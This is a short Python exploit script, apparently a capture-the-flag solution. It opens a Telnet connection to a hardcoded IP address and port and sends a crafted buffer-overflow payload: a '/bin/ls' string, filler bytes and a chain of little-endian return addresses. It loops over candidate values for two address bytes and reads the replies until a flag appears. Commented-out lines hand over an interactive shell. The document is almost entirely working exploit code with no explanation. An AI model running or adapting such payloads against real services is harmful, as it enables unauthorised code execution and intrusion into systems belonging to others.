# from pwn import *
from telnetlib import Telnet


def run(b1, b2):
    r = Telnet('46.101.107.117', 2112)

    r.read_until(b'> ')

    # crafting payload
    payload = b'/bin/ls\x00AABBBBBBBBBBCCCCCCCCCCDDEEEEEEEE' + \
            bytes([0xc1, 0x07, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) + \
            bytes([0xbf, 0x07, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) + \
            b1 + b2 + \
            bytes([0xff, 0xff, 0xff, 0x7f, 0x00, 0x00]) + \
            bytes([0x20, 0x06, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) + \
            b'\n'
# bytes([0xcc, 0x07, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]) + \
    r.write(payload)
    s = r.read_until(b'\n')
    print(hex(int.from_bytes(b1,'little')), b1,b2, s)
    try:
        with open('payload', 'wb') as payF:
            payF.write(payload)
        s = r.read_until(b'flag')
        print('XXXXX', s)
        s = 1 / 0
    except EOFError:
        pass
    except ConnectionResetError:
        pass


for b2 in range(0xe1, 0xe2):
    for b1 in range(0,256,4):
        # print(b1.to_bytes(1,'little'), bytes(b2))
        run(b1.to_bytes(1,'little'), b2.to_bytes(1,'little'))


# with open('payload', 'wb') as payF:
#     payF.write(payload)


# # r.read_until(b'\033[H\033[J\033[8;0H')
# # log.info('enjoy your shell :)')
# r.interact()
